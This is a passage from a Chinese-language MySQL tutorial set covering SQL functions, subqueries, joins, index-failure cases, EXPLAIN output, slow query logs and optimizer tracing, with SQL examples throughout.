 GROUP BY e.Employees_id, e.Employees_name
 ORDER BY 销售总业绩 DESC;
 SELECT c.Customer_name, m.Commodity_name, SUM(sl.Sales_Number) AS 购买数量
 from customer_info c
 inNER JOIN sales_info s ON c.Customer_id = s.Customer_id
 inNER JOIN sales_list sl ON s.Sales_id = sl.Sales_id
 inNER JOIN commodity_info m ON sl.Commodity_id = m.Commodity_id
 GROUP BY c.Customer_name, m.Commodity_name;
 SELECT e.Employees_name, s.Sales_id, c.Customer_name,
  m.Commodity_name, s.Sales_time, sl.Sales_Number
 from employees_info e
 inNER JOIN sales_info s ON e.Employees_id = s.Employees_id
 inNER JOIN customer_info c ON s.Customer_id = c.Customer_id
 inNER JOIN sales_list sl ON s.Sales_id = sl.Sales_id
 inNER JOIN commodity_info m ON sl.Commodity_id = m.Commodity_id;
```

## 4. 最佳实践

### 4.1 SQL 编写规范

1. **使用大写关键字**：提高可读性

```sql
 -- 推荐
 SELECT id, username, email FROM users WHERE status = 1;
 -- 不推荐
 select id, username, email from users where status = 1;
```

2. **使用缩进和对齐**：使代码结构清晰

```sql
 SELECT
 u.id,
 u.username,
 o.order_no,
 o.total_amount
 FROM users u
 INNER JOIN orders o ON u.id = o.user_id
 WHERE o.status = 1
 ORDER BY o.created_at DESC;
```

3. **添加注释**：解释复杂逻辑

```sql
 -- 查询活跃用户（30天内有登录）
 SELECT * FROM users
 WHERE last_login_time > DATE_SUB(NOW(), INTERVAL 30 DAY);
```

4. **避免 SELECT \***：只选择需要的列

```sql
 -- 推荐
 SELECT id, username, email FROM users;
 -- 不推荐
 SELECT * FROM users;
```

5. **使用有意义别名**：提高可读性

```sql
 -- 推荐
 SELECT u.username, o.order_no FROM users u INNER JOIN orders o ON u.id = o.user_id;
 -- 不推荐
 SELECT a.username, b.order_no FROM users a INNER JOIN orders b ON a.id = b.user_id;
```

### 4.2 性能优化

1. **使用索引**：为常用查询列创建索引
2. **避免 SELECT \***：减少网络传输
3. **使用 LIMIT**：限制返回行数
4. **避免在 WHERE 中使用函数**：导致索引失效
5. **合理使用 JOIN**：避免过多表连接
6. **优化 GROUP BY**：确保有适当的索引
7. **使用 EXPLAIN**：分析查询计划

### 4.3 安全实践

1. **参数化查询**：防止 SQL 注入
2. **最小权限原则**：为用户分配最小必要权限
3. **加密敏感数据**：密码、身份证号等
4. **输入验证**：验证和过滤用户输入
5. **定期备份**：确保数据安全

## 5. 常见问题与解决方案

### 5.1 SQL 注入

**问题**：恶意用户通过输入特殊字符来修改 SQL 语句
**解决方案**：

- 使用参数化查询/预编译语句
- 对输入进行验证和过滤
- 使用存储过程封装数据访问

### 5.2 索引失效

**问题**：查询没有使用索引，导致性能下降
**原因**：

- 在 WHERE 子句中使用函数
- 使用 != 或 <> 操作符
- 使用 LIKE '%...' 模式
- 数据类型不匹配
  **解决方案**：
- 避免在索引列上使用函数
- 使用 EXPLAIN 分析查询
- 创建合适的索引

### 5.3 死锁

**问题**：多个事务相互等待对方释放资源
**解决方案**：

- 保持事务简短
- 按相同顺序访问表
- 使用适当的隔离级别
- 避免长时间锁定资源

## 6. 总结

本章节详细介绍了 SQL 的高级特性，包括：

1. **内置函数**：字符串、日期、数值、条件函数
2. **子查询**：嵌套查询的各种用法
3. **多表查询**：内连接、外连接、自连接
4. **最佳实践**：SQL 编写规范、性能优化、安全实践
5. **常见问题**：SQL 注入、索引失效、死锁

---

## 字符串函数

**单行写法：CONCAT 连接字符串**
`CONCAT(<字符串1>[, <字符串2>...])`
```sql
-- 连接用户名和邮箱
SELECT CONCAT(username, ' (', email, ')') AS user_info FROM users;
```

**单行写法：CONCAT_WS 带分隔符连接**
`CONCAT_WS('<分隔符>', <字符串1>[, <字符串2>...])`
```sql
-- 带分隔符连接地址字段
SELECT CONCAT_WS('-', province, city, district) AS full_address FROM addresses;
```

**单行写法：LENGTH 字节长度**
`LENGTH(<字符串>)`
```sql
-- 获取用户名的字节长度
SELECT LENGTH(username) AS name_bytes FROM users;
```

**单行写法：CHAR_LENGTH 字符长度**
`CHAR_LENGTH(<字符串>)`
```sql
-- 获取用户名的字符长度
SELECT CHAR_LENGTH(username) AS name_chars FROM users;
```

**单行写法：SUBSTRING 截取字符串**
`SUBSTRING(<字符串>, <起始位置>[, <长度>])`
```sql
-- 截取手机号前 3 位
SELECT SUBSTRING(phone, 1, 3) AS phone_prefix FROM users;
```

**单行写法：LEFT 从左截取**
`LEFT(<字符串>, <长度>)`
```sql
-- 从左截取用户名前 2 位
SELECT LEFT(username, 2) FROM users;
```

**单行写法：RIGHT 从右截取**
`RIGHT(<字符串>, <长度>)`
```sql
-- 从右截取用户名后 2 位
SELECT RIGHT(username, 2) FROM users;
```

**单行写法：TRIM 去除首尾空格**
`TRIM(<字符串>)`
```sql
-- 去除字符串首尾空格
SELECT TRIM(' Hello ');
```

**单行写法：LOWER 转小写**
`LOWER(<字符串>)`
```sql
-- 将邮箱转为小写
SELECT LOWER(email) AS email_lower FROM users;
```

**单行写法：UPPER 转大写**
`UPPER(<字符串>)`
```sql
-- 将用户名转为大写
SELECT UPPER(username) AS name_upper FROM users;
```

**单行写法：REPLACE 替换字符串**
`REPLACE(<字符串>, '<旧子串>', '<新子串>')`
```sql
-- 替换字符串中的字符
SELECT REPLACE('Hello', 'l', 'w');
```

**单行写法：REVERSE 反转字符串**
`REVERSE(<字符串>)`
```sql
-- 反转字符串
SELECT REVERSE('Hello');
```

**单行写法：LPAD 左填充**
`LPAD(<字符串>, <长度>, '<填充字符>')`
```sql
-- 左填充数字到 3 位
SELECT LPAD('5', 3, '0');
```

**单行写法：RPAD 右填充**
`RPAD(<字符串>, <长度>, '<填充字符>')`
```sql
-- 右填充字符串到 5 位
SELECT RPAD('5', 5, '0');
```

**单行写法：INSTR 查找子串位置**
`INSTR(<字符串>, '<子串>')`
```sql
-- 查找子串位置
SELECT INSTR('Hello', 'll');
```

---

## 日期时间函数

**单行写法：NOW 当前日期时间**
`NOW()`
```sql
-- 获取当前日期时间
SELECT NOW() AS now;
```

**单行写法：CURDATE 当前日期**
`CURDATE()`
```sql
-- 获取当前日期
SELECT CURDATE() AS today;
```

**单行写法：CURTIME 当前时间**
`CURTIME()`
```sql
-- 获取当前时间
SELECT CURTIME() AS current_time;
```

**单行写法：DATE 提取日期**
`DATE(<日期时间>)`
```sql
-- 提取日期部分
SELECT DATE('2024-01-15 10:30:00');
```

**单行写法：TIME 提取时间**
`TIME(<日期时间>)`
```sql
-- 提取时间部分
SELECT TIME('2024-01-15 10:30:00');
```

**单行写法：YEAR 提取年份**
`YEAR(<日期>)`
```sql
-- 提取当前年份
SELECT YEAR(NOW());
```

**单行写法：MONTH 提取月份**
`MONTH(<日期>)`
```sql
-- 提取当前月份
SELECT MONTH(NOW());
```

**单行写法：DAY 提取日**
`DAY(<日期>)`
```sql
-- 提取当前日
SELECT DAY(NOW());
```

**单行写法：HOUR 提取小时**
`HOUR(<时间>)`
```sql
-- 提取当前小时
SELECT HOUR(NOW());
```

**单行写法：MINUTE 提取分钟**
`MINUTE(<时间>)`
```sql
-- 提取当前分钟
SELECT MINUTE(NOW());
```

**单行写法：SECOND 提取秒**
`SECOND(<时间>)`
```sql
-- 提取当前秒
SELECT SECOND(NOW());
```

**单行写法：DATE_FORMAT 格式化日期**
`DATE_FORMAT(<日期>, '<格式>')`
```sql
-- 格式化日期显示
SELECT DATE_FORMAT(NOW(), '%Y年%m月%d日 %H:%i:%s') AS formatted;
```

**单行写法：DATE_ADD 日期加**
`DATE_ADD(<日期>, INTERVAL <值> <单位>)`
```sql
-- 日期加 7 天
SELECT DATE_ADD(NOW(), INTERVAL 7 DAY) AS next_week;
```

**单行写法：DATE_SUB 日期减**
`DATE_SUB(<日期>, INTERVAL <值> <单位>)`
```sql
-- 日期减 1 个月
SELECT DATE_SUB(NOW(), INTERVAL 1 MONTH) AS last_month;
```

**单行写法：DATEDIFF 日期差**
`DATEDIFF(<日期1>, <日期2>)`
```sql
-- 计算注册至今天数
SELECT DATEDIFF(NOW(), created_at) AS days_since_join FROM users;
```

**单行写法：TIMESTAMPDIFF 时间差**
`TIMESTAMPDIFF(<单位>, <开始>, <结束>)`
```sql
-- 计算注册至今年数
SELECT TIMESTAMPDIFF(YEAR, created_at, NOW()) AS years_since_join FROM users;
```

**单行写法：计算年龄**
`TIMESTAMPDIFF(YEAR, <生日列>, NOW())`
```sql
-- 根据生日计算年龄
SELECT TIMESTAMPDIFF(YEAR, birthday, NOW()) AS age FROM users;
```

**单行写法：DAYOFWEEK 星期几**
`DAYOFWEEK(<日期>)`
```sql
-- 获取星期几
SELECT DAYOFWEEK(NOW());
```

**单行写法：LAST_DAY 月份最后一天**
`LAST_DAY(<日期>)`
```sql
-- 获取月份最后一天
SELECT LAST_DAY('2024-01-15');
```

---

## 数值函数

**单行写法：ABS 绝对值**
`ABS(<数值>)`
```sql
-- 获取绝对值
SELECT ABS(-10);
```

**单行写法：ROUND 四舍五入**
`ROUND(<数值>[, <小数位>])`
```sql
-- 四舍五入保留 2 位小数
SELECT ROUND(price, 2) AS rounded FROM products;
```

**单行写法：CEIL 向上取整**
`CEIL(<数值>)`
```sql
-- 向上取整
SELECT CEIL(price) AS ceil_price FROM products;
```

**单行写法：FLOOR 向下取整**
`FLOOR(<数值>)`
```sql
-- 向下取整
SELECT FLOOR(price) AS floor_price FROM products;
```

**单行写法：MOD 取模**
`MOD(<数值1>, <数值2>)`
```sql
-- 取模运算
SELECT MOD(10, 3);
```

**单行写法：POW 幂运算**
`POW(<底数>, <指数>)`
```sql
-- 幂运算
SELECT POW(2, 3);
```

**单行写法：SQRT 平方根**
`SQRT(<数值>)`
```sql
-- 平方根
SELECT SQRT(16);
```

**单行写法：RAND 随机数**
`RAND()`
```sql
-- 随机排序取 5 行
SELECT * FROM users ORDER BY RAND() LIMIT 5;
```

**单行写法：TRUNCATE 截断**
`TRUNCATE(<数值>, <小数位>)`
```sql
-- 截断到 3 位小数
SELECT TRUNCATE(3.14159, 3);
```

**单行写法：SIGN 符号**
`SIGN(<数值>)`
```sql
-- 获取数值符号
SELECT SIGN(-10);
```

---

## 条件函数

**单行写法：IF 条件判断**
`IF(<条件>, <真值>, <假值>)`
```sql
-- 根据年龄判断成人或未成年
SELECT username, age, IF(age >= 18, '成人', '未成年') AS age_desc FROM users;
```

**单行写法：IFNULL NULL 替换**
`IFNULL(<值>, <默认值>)`
```sql
-- 替换 NULL 值为默认值
SELECT username, IFNULL(email, '未填写') AS email FROM users;
```

**单行写法：嵌套 IFNULL**
`IFNULL(<值>, IFNULL(<值2>, <默认值>))`
```sql
-- 嵌套 IFNULL 处理多个可能为空的字段
SELECT IFNULL(phone, IFNULL(telephone, '无')) AS contact FROM users;
```

**单行写法：NULLIF 相等返回 NULL**
`NULLIF(<值1>, <值2>)`
```sql
-- 两值相等返回 NULL
SELECT NULLIF(a, b);
```

**换行写法：CASE WHEN 多条件判断**
`CASE WHEN <条件> THEN <值> [WHEN ...] [ELSE <值>] END`
```sql
-- 多条件判断年龄分组
SELECT
  username,
  age,
  CASE
    WHEN age < 18 THEN '未成年'
    WHEN age < 30 THEN '青年'
    WHEN age < 60 THEN '中年'
    ELSE '老年'
  END AS age_group
FROM users;
```

**换行写法：CASE 表达式等值匹配**
`CASE <表达式> WHEN <值> THEN <结果> [WHEN ...] [ELSE <结果>] END`
```sql
-- 等值匹配状态值
SELECT
  username,
  CASE status
    WHEN 1 THEN '正常'
    WHEN 2 THEN '冻结'
    WHEN 0 THEN '禁用'
    ELSE '未知'
  END AS status_desc
FROM users;
```

**换行写法：CASE 聚合条件计数**
`SUM(CASE WHEN <条件> THEN 1 ELSE 0 END)`
```sql
-- 条件计数统计不同状态数量
SELECT
  SUM(CASE WHEN status = 1 THEN 1 ELSE 0 END) AS active_count,
  SUM(CASE WHEN status = 0 THEN 1 ELSE 0 END) AS inactive_count
FROM users;
```

---

## 类型转换与系统函数

**单行写法：CAST 类型转换**
`CAST(<值> AS <类型>)`
```sql
-- 将价格转换为字符类型
SELECT CAST(price AS CHAR) FROM products;
```

**单行写法：CONVERT 类型转换**
`CONVERT(<值>, <类型>)`
```sql
-- 将价格转换为 DECIMAL 类型
SELECT CONVERT(price, DECIMAL(10,2)) FROM products;
```

**单行写法：FORMAT 格式化数字**
`FORMAT(<数值>, <小数位>)`
```sql
-- 格式化数字带千位分隔符
SELECT FORMAT(price, 2) AS price_formatted FROM products;
```

**单行写法：MD5 哈希**
`MD5('<字符串>')`
```sql
-- 计算 MD5 哈希
SELECT MD5('password') AS md5_hash;
```

**单行写法：SHA1 哈希**
`SHA1('<字符串>')`
```sql
-- 计算 SHA1 哈希
SELECT SHA1('password') AS sha1_hash;
```

**单行写法：SHA2 哈希**
`SHA2('<字符串>', <长度>)`
```sql
-- 计算 SHA256 哈希
SELECT SHA2('password', 256) AS sha256_hash;
```

**单行写法：UUID 生成**
`UUID()`
```sql
-- 生成 UUID
SELECT UUID() AS uuid;
```

**单行写法：SET 用户变量**
`SET @<变量名> = <值>`
```sql
-- 设置用户变量
SET @total = 0;
```

**单行写法：SELECT 变量累加**
`SELECT @<变量名> := @<变量名> + <表达式>`
```sql
-- 用户变量累加
SELECT @total := @total + price FROM products;
```

---

## 子查询

**单行写法：标量子查询最大值**
`SELECT * FROM <表名> WHERE <列名> = (SELECT MAX(<列名>) FROM <表名>)`
```sql
-- 查询年龄最大的用户
SELECT * FROM users WHERE age = (SELECT MAX(age) FROM users);
```

**单行写法：标量子查询平均值**
`SELECT * FROM <表名> WHERE <列名> > (SELECT AVG(<列名>) FROM <表名>)`
```sql
-- 查询年龄大于平均年龄的用户
SELECT * FROM users WHERE age > (SELECT AVG(age) FROM users);
```

**单行写法：用子查询更新**
`UPDATE <表名> SET <列名> = (SELECT <聚合> FROM <表名>) WHERE <条件>`
```sql
-- 用子查询结果更新字段
UPDATE users SET age = (SELECT MAX(age) FROM users) + 1 WHERE id = 1;
```

**单行写法：IN 子查询**
`WHERE <列名> IN (SELECT <列名> FROM <表名>)`
```sql
-- 查询属于 VIP 用户表的用户
SELECT * FROM users WHERE id IN (SELECT user_id FROM vip_users);
```

**单行写法：NOT IN 子查询**
`WHERE <列名> NOT IN (SELECT <列名> FROM <表名>)`
```sql
-- 查询不在黑名单中的用户
SELECT * FROM users WHERE id NOT IN (SELECT user_id FROM blocked_users);
```

**单行写法：ANY 子查询**
`WHERE <列名> <操作符> ANY (SELECT ...)`
```sql
-- 满足子查询中任意一个值
SELECT * FROM products WHERE price > ANY (SELECT price FROM products WHERE category_id = 1);
```

**单行写法：ALL 子查询**
`WHERE <列名> <操作符> ALL (SELECT ...)`
```sql
-- 满足子查询中所有值
SELECT * FROM products WHERE price > ALL (SELECT price FROM products WHERE status = 0);
```

**换行写法：EXISTS 子查询**
`WHERE EXISTS (SELECT 1 FROM <表名> WHERE <条件>)`
```sql
-- 查询有订单的用户
SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
```

**换行写法：NOT EXISTS 子查询**
`WHERE NOT EXISTS (SELECT 1 FROM <表名> WHERE <条件>)`
```sql
-- 查询没有订单的用户
SELECT * FROM users u WHERE NOT EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
```

**换行写法：FROM 子查询作为临时表**
`SELECT * FROM (SELECT ...) AS <别名>`
```sql
-- 子查询作为临时表查询
SELECT * FROM (SELECT * FROM users WHERE status = 1) AS active_users;
```

**换行写法：分组统计子查询**
`SELECT * FROM (SELECT <列名>, <聚合> FROM <表名> GROUP BY <列名>) AS <别名>`
```sql
-- 分组统计子查询
SELECT * FROM (
  SELECT status, COUNT(*) AS count, AVG(age) AS avg_age
  FROM users
  GROUP BY status
) AS stats;
```

**换行写法：SELECT 列子查询**
`SELECT <列名>, (SELECT ...) AS <别名>`
```sql
-- 列子查询统计订单数
SELECT
  u.id,
  u.username,
  (SELECT COUNT(*) FROM orders WHERE user_id = u.id) AS order_count
FROM users u;
```

**换行写法：SELECT 列子查询最新时间**
`SELECT <列名>, (SELECT MAX(<列名>) FROM <表名> WHERE <条件>) AS <别名>`
```sql
-- 查询用户最新订单时间
SELECT
  u.id,
  u.username,
  (SELECT MAX(created_at) FROM orders WHERE user_id = u.id) AS last_order_time
FROM users u;
```

---

## 多表查询

**换行写法：两表内连接**
`SELECT <列名> FROM <表1> [AS <别名>] INNER JOIN <表2> [AS <别名>] ON <条件>`
```sql
-- 两表内连接查询
SELECT u.username, o.order_no, o.total_amount
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
```

**换行写法：多表内连接**
`SELECT <列名> FROM <表1> JOIN <表2> ON <条件> JOIN <表3> ON <条件>`
```sql
-- 多表内连接查询
SELECT u.username, o.order_no, p.product_name, oi.quantity
FROM users u
INNER JOIN orders o ON u.id = o.user_id
INNER JOIN order_items oi ON o.id = oi.order_id
INNER JOIN products p ON oi.product_id = p.id;
```

**换行写法：USING 简写内连接**
`SELECT <列名> FROM <表1> INNER JOIN <表2> USING (<列名>)`
```sql
-- 使用 USING 简写连接条件
SELECT u.username, o.order_no
FROM users u
INNER JOIN orders o USING (user_id);
```

**换行写法：左连接**
`SELECT <列名> FROM <表1> LEFT JOIN <表2> ON <条件>`
```sql
-- 左连接查询左表全部数据
SELECT u.username, o.order_no, o.total_amount
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
```

**换行写法：左连接分组统计**
`SELECT <列名>, COUNT(<列名>) FROM <表1> LEFT JOIN <表2> ON <条件> GROUP BY <列名>`
```sql
-- 左连接分组统计订单数
SELECT u.username, COUNT(o.id) AS order_count
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.username;
```

**换行写法：左连接找出无关联数据**
`SELECT <列名> FROM <表1> LEFT JOIN <表2> ON <条件> WHERE <表2.列> IS NULL`
```sql
-- 找出没有订单的用户
SELECT u.*
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;
```

**换行写法：右连接**
`SELECT <列名> FROM <表1> RIGHT JOIN <表2> ON <条件>`
```sql
-- 右连接查询右表全部数据
SELECT u.username, o.order_no
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;
```

**换行写法：自连接**
`SELECT <列名> FROM <表> [AS <别名1>] JOIN <表> [AS <别名2>] ON <条件>`
```sql
-- 员工与经理自连接
SELECT e.name AS employee, m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;
```

**换行写法：UNION 实现全连接**
`SELECT ... LEFT JOIN ... UNION SELECT ... RIGHT JOIN ...`
```sql
-- MySQL 用 UNION 实现 FULL OUTER JOIN
SELECT u.username, o.order_no
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
UNION
SELECT u.username, o.order_no
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;
```

**换行写法：交叉连接**
`SELECT <列名> FROM <表1> CROSS JOIN <表2>`
```sql
-- 笛卡尔积交叉连接
SELECT u.username, p.product_name
FROM users u
CROSS JOIN products p;
```

---

## UNION 合并查询

**换行写法：UNION 去重合并**
`SELECT ... UNION SELECT ...`
```sql
-- 合并结果集并去重
SELECT username FROM users WHERE status = 1
UNION
SELECT username FROM users WHERE age > 30;
```

**换行写法：UNION ALL 保留重复合并**
`SELECT ... UNION ALL SELECT ...`
```sql
-- 合并结果集保留重复
SELECT username FROM users WHERE status = 1
UNION ALL
SELECT username FROM users WHERE age > 30;
```

<!-- ============ 文档分隔线：020-mysql/021-IndexFailureScene.md ============ -->

## 1. 索引失效常见场景

### 1.1 对索引列使用函数

```sql
-- 索引 (created_at)
-- 失效：对列使用函数
SELECT * FROM orders WHERE YEAR(created_at) = 2026;
SELECT * FROM orders WHERE DATE(created_at) = '2026-06-14';

-- 优化：改写条件
SELECT * FROM orders WHERE created_at >= '2026-01-01' AND created_at < '2027-01-01';
SELECT * FROM orders WHERE created_at >= '2026-06-14' AND created_at < '2026-06-15';
```

### 1.2 隐式类型转换

```sql
-- 索引 (phone VARCHAR)
-- 失效：字符串列与数字比较
SELECT * FROM users WHERE phone = 13800138000;  -- 隐式转换为字符串

-- 优化：使用字符串常量
SELECT * FROM users WHERE phone = '13800138000';
```

### 1.3 LIKE 前缀通配符

```sql
-- 索引 (name)
-- 失效：以通配符开头
SELECT * FROM users WHERE name LIKE '%张';
SELECT * FROM users WHERE name LIKE '%张%';

-- 可用：前缀匹配
SELECT * FROM users WHERE name LIKE '张%';
```

### 1.4 OR 条件

```sql
-- 索引 (a), 索引 (b)
-- 可能失效：OR 连接不同索引列
SELECT * FROM t WHERE a = 1 OR b = 2;
-- MySQL 可能使用 index_merge，但效率不如联合索引

-- 优化：使用 UNION ALL
SELECT * FROM t WHERE a = 1
UNION ALL
SELECT * FROM t WHERE b = 2 AND a <> 1;
```

### 1.5 联合索引跳列

```sql
-- 索引 (a, b, c)
-- 失效：跳过最左列
SELECT * FROM t WHERE b = 2;

-- 部分失效：跳过中间列
SELECT * FROM t WHERE a = 1 AND c = 3;  -- 只用 a
```

### 1.6 NOT 条件

```sql
-- 索引 (status)
-- 通常失效：NOT / != / <>
SELECT * FROM orders WHERE status != 'cancelled';
SELECT * FROM orders WHERE NOT (status = 'cancelled');

-- 优化：改写为 IN
SELECT * FROM orders WHERE status IN ('pending', 'processing', 'shipped');
```

### 1.7 IS NOT NULL

```sql
-- MySQL 8.0+ 支持 IS NOT NULL 使用索引
-- 旧版本可能不使用
SELECT * FROM users WHERE phone IS NOT NULL;
```

### 1.8 计算表达式

```sql
-- 索引 (salary)
-- 失效：列参与计算
SELECT * FROM employees WHERE salary * 12 > 100000;

-- 优化：将计算移到常量侧
SELECT * FROM employees WHERE salary > 100000 / 12;
```

## 2. 索引失效诊断

```sql
-- 使用 EXPLAIN 检查
EXPLAIN SELECT * FROM orders WHERE YEAR(created_at) = 2026;
-- type: ALL, key: NULL → 索引失效

-- 使用 EXPLAIN ANALYZE 查看实际执行
EXPLAIN ANALYZE SELECT * FROM orders WHERE YEAR(created_at) = 2026;
```

<!-- ============ 文档分隔线：020-mysql/022-EXPLAINDetailed.md ============ -->

## 1. EXPLAIN 输出列

| 列            | 含义                 |
| ------------- | -------------------- |
| id            | SELECT 标识符        |
| select_type   | 查询类型             |
| table         | 访问的表             |
| partitions    | 匹配的分区           |
| **type**      | 访问类型（最重要）   |
| possible_keys | 可能使用的索引       |
| **key**       | 实际使用的索引       |
| key_len       | 使用的索引长度       |
| ref           | 与索引比较的列或常量 |
| **rows**      | 估算扫描行数         |
| **filtered**  | 过滤比例             |
| **Extra**     | 额外信息             |

## 2. type 详解

从最优到最差：

| type            | 说明                          | 示例                        |
| --------------- | ----------------------------- | --------------------------- |
| system          | 表中只有一行                  | `WHERE id = 1`（单行表）    |
| const           | 主键/唯一索引等值查询         | `WHERE id = 1`              |
| eq_ref          | JOIN 中主键/唯一索引等值      | `JOIN ON a.id = b.id`       |
| ref             | 非唯一索引等值查询            | `WHERE dept_id = 5`         |
| fulltext        | 全文索引                      | `MATCH ... AGAINST`         |
| ref_or_null     | 类似 ref，额外搜索 NULL       | `WHERE dept_id = 5 OR NULL` |
| index_merge     | 索引合并                      | `WHERE a=1 OR b=2`          |
| unique_subquery | IN 子查询优化为唯一索引查找   | `WHERE id IN (SELECT ...)`  |
| index_subquery  | IN 子查询优化为非唯一索引查找 | `WHERE dept_id IN (...)`    |
| range           | 范围扫描                      | `WHERE id > 100`            |
| index           | 全索引扫描                    | `ORDER BY id`（无WHERE）    |
| ALL             | 全表扫描                      | 无索引条件                  |

## 3. key 与 key_len

```sql
-- key：实际使用的索引名
-- key = NULL：未使用索引

-- key_len：使用的索引字节数
-- 可判断联合索引使用了几个列

-- 索引 (dept_id INT, name VARCHAR(50))
-- dept_id: 4字节 + 1字节(NULL标志) = 5
-- name: 50*3(utf8mb4) + 2(变长) + 1(NULL) = 153

-- key_len = 5：只用了 dept_id
-- key_len = 158：用了 dept_id + name
```

## 4. rows 与 filtered

```sql
-- rows：估算扫描行数
-- filtered：过滤比例（0.00-100.00）
-- 实际返回行 ≈ rows × filtered / 100

-- 示例：rows=1000, filtered=10.00
-- 实际返回约 100 行
```

## 5. Extra 详解

| Extra 值                          | 含义                                |
| --------------------------------- | ----------------------------------- |
| Using index                       | 覆盖索引，无需回表                  |
| Using where                       | Server 层过滤                       |
| Using index condition             | 索引下推（ICP）                     |
| Using temporary                   | 使用临时表                          |
| Using filesort                    | 额外排序（非索引排序）              |
| Using join buffer                 | 使用连接缓冲区（Block Nested Loop） |
| Using MRR                         | 多范围读优化                        |
| Using index for group-by          | 索引用于 GROUP BY                   |
| Using where with pushed condition | 索引条件下推                        |
| Impossible WHERE                  | WHERE 不可能为真                    |
| Select tables optimized away      | 优化为常量（如 MIN/MAX 使用索引）   |

## 6. EXPLAIN ANALYZE

```sql
-- MySQL 8.0.18+：实际执行并返回真实数据
EXPLAIN ANALYZE
SELECT * FROM employees WHERE dept_id = 5;

-- 输出包含：
-- actual time：实际执行时间
-- actual rows：实际返回行数
-- loops：执行次数
-- 估算值 vs 实际值对比
```

<!-- ============ 文档分隔线：020-mysql/023-SlowQueryLog.md ============ -->

## 1. 慢查询日志配置

```sql
-- 查看慢查询日志状态
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';

-- 开启慢查询日志
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 1;  -- 超过1秒记录
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- 记录未使用索引的查询
SET GLOBAL log_queries_not_using_indexes = ON;

-- 每分钟限制记录条数（防止日志膨胀）
SET GLOBAL log_throttle_queries_not_using_indexes = 60;
```

## 2. 日志格式

```
# Time: 2026-06-14T10:30:00.123456+08:00
# User@Host: app_user[app_user] @ web-server [192.168.1.100]
# Query_time: 5.123456  Lock_time: 0.000123  Rows_sent: 100  Rows_examined: 1000000
SET timestamp=1718334600;
SELECT * FROM orders WHERE YEAR(created_at) = 2026;
```

## 3. 分析工具

### 3.1 mysqldumpslow

```bash
# 按查询时间排序，显示前10条
mysqldumpslow -s t -t 10 /var/log/mysql/slow.log

# 按查询次数排序
mysqldumpslow -s c -t 10 /var/log/mysql/slow.log

# 选项：
# -s t: 按查询时间排序
# -s c: 按查询次数排序
# -s l: 按锁定时间排序
# -s r: 按返回记录数排序
# -t N: 显示前N条
```

### 3.2 pt-query-digest

```bash
# 分析慢查询日志
pt-query-digest /var/log/mysql/slow.log

# 分析特定时间段的查询
pt-query-digest --since '2026-06-14 00:00:00' --until '2026-06-14 23:59:59' /var/log/mysql/slow.log

# 输出报告包含：
# - 总体统计
# - 查询指纹和排名
# - 每个查询的详细统计
# - EXPLAIN 示例
```

## 4. 优化流程

```
1. 识别慢查询 → 慢查询日志
2. 分析执行计划 → EXPLAIN
3. 定位瓶颈 → 全表扫描、filesort、临时表
4. 优化方案 → 添加索引、改写查询、调整参数
5. 验证效果 → EXPLAIN ANALYZE
```

<!-- ============ 文档分隔线：020-mysql/024-OptimizerTrace.md ============ -->

## 1. 优化器追踪概述

MySQL 5.6 引入 OPTIMIZER_TRACE，记录优化器选择执行计划的完整过程。

## 2. 使用方法

```sql
-- 开启优化器追踪
SET optimizer_trace = 'enabled=on';
SET optimizer_trace_max_mem_size = 1048576;  -- 1MB

-- 执行查询
SELECT * FROM employees WHERE dept_id = 5;

-- 查看追踪结果
SELECT * FROM information_schema.OPTIMIZER_TRACE\G

-- 关闭追踪
SET optimizer_trace = 'enabled=off';
```

## 3. 追踪结果解读

```json
{
  "steps": [
    {
      "join_preparation": {
        "select#": 1,
        "steps": [
          {"expanded_query": "/* select#1 */ SELECT ..."}
        ]
      }
    },
    {
      "join_optimization": {
        "select#": 1,
        "steps": [
          {"condition_processing": {"condition": "WHERE"}},
          {"substitute_generated_columns": {}},
          {"table_dependencies": [...]},
          {"ref_optimizer_key_uses": [...]},
          {"rows_estimation": [...]},
          {"considered_execution_plans": [...]},
          {"attaching_conditions_to_tables": [...]}
        ]
      }
    },
    {
      "join_execution": {
        "select#": 1,
        "steps": [...]
      }
    }
  ]
}
```

## 4. 关键信息

### 4.1 rows_estimation

```json
{
  "rows_estimation": [
    {
      "table": "employees",
      "range_analysis": {
        "table_scan": { "rows": 10000, "cost": 2050 },
        "potential_range_indices": [
          { "index": "idx_dept", "usable": true, "key_parts": ["dept_id"] }
        ],
        "best_range_access": {
          "chosen": true,
          "index": "idx_dept",
          "rows": 100,
          "cost": 121
        }
      }
    }
  ]
}
```

### 4.2 considered_execution_plans

```json
{
  "considered_execution_plans": [
    {
      "plan_prefix": [],
      "table": "employees",
      "best_access_path": {
        "considered_access_paths": [
          { "access_type": "ref", "index": "idx_dept", "cost": 50, "chosen": true },
          { "access_type": "scan", "cost": 2050, "chosen": false }
        ]
      },
      "cost_for_plan": 50,
      "chosen": true
    }
  ]
}
```

## 5. 实际应用

```sql
-- 诊断优化器为何选择全表扫描
SET optimizer_trace = 'enabled=on';
SELECT * FROM large_table WHERE status = 'rare_value';
SELECT TRACE FROM information_schema.OPTIMIZER_TRACE\G
-- 查看 range_analysis 中各索引的代价估算
-- 如果索引代价估算偏高，可能需要更新统计信息
ANALYZE TABLE large_table;
```

<!-- ============ 文档分隔线：020-mysql/025-SubqueryOptimization.md ============ -->

## 1. 子查询优化概述

MySQL 优化器对子查询有多种优化策略，理解这些策略有助于编写高效的查询。

## 2. 半连接优化

### 2.1 IN 子查询转半连接

```sql
-- 原始查询
SELECT * FROM orders
WHERE user_id IN (SELECT id FROM users WHERE vip = true);

-- 优化器可能转换为半连接
-- Semi Join：找到第一个匹配即停止
```

### 2.2 半连接策略

| 策略                | 说明                           |
| ------------------- | ------------------------------ |
